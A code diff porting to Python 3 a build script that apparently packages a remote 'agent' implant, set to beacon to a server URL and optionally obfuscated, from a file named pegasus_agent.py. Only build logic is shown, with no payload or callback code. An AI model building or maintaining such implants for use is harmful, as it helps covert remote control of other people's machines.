@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 
 import os
 import shutil
@@ -17,10 +17,10 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
     prog_name = os.path.basename(output)
     platform = platform.lower()
     if platform not in ['linux', 'windows']:
-        print "[!] Supported platforms are 'Linux' and 'Windows'"
+        print("[!] Supported platforms are 'Linux' and 'Windows'")
         exit(0)
     if os.name != 'posix' and platform == 'linux':
-        print "[!] Can only build Linux agents on Linux."
+        print("[!] Can only build Linux agents on Linux.")
         exit(0)
     working_dir = os.path.join(tempfile.gettempdir(), 'loki')
     if os.path.exists(working_dir):
@@ -38,7 +38,7 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
         agent_config.write(config_file)
     cwd = os.getcwd()
     os.chdir(working_dir)
-    shutil.move('agent.py', prog_name + '.py')
+    shutil.move('pegasus_agent.py', prog_name + '.py')
     
     # Build the agent
     if platform == 'linux':
@@ -55,20 +55,20 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
     
     # Apply obfuscation if requested
     if obfuscate and OBFUSCATION_AVAILABLE:
-        print "[+] Applying obfuscation..."
+        print("[+] Applying obfuscation...")
         obfuscated_file = agent_file + ".obfuscated"
         if obfuscate_payload(agent_file, obfuscated_file):
             # Replace the original file with the obfuscated one
             os.remove(agent_file)
             os.rename(obfuscated_file, agent_file)
-            print "[+] Obfuscation applied successfully"
+            print("[+] Obfuscation applied successfully")
         else:
-            print "[-] Failed to apply obfuscation"
+            print("[-] Failed to apply obfuscation")
     
     os.chdir(cwd)
-    os.rename(agent_file, output)
+    shutil.move(agent_file, output)
     shutil.rmtree(working_dir)
-    print "[+] Agent built successfully: %s" % output
+    print("[+] Agent built successfully: %s" % output)
 
 
 def main():
